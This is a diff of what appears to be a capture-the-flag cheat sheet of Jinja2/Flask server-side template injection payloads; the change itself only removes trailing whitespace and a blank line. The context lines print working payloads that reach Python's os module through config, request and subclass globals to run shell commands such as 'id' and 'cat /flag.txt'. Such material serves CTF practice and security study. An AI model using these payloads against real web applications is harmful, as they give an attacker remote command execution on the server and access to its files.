@@ -21,7 +21,7 @@ tricks:
     payload: |
       # Access config object
       {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
-      
+
       # Or through subclasses
       {{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
 
@@ -38,4 +38,3 @@ tricks:
     payload: |
       {{ request.__class__._load_form_data.__globals__['os'].popen('cat /flag.txt').read() }}
       {{ request.application.__globals__['os'].popen('cat /flag.txt').read() }}
-
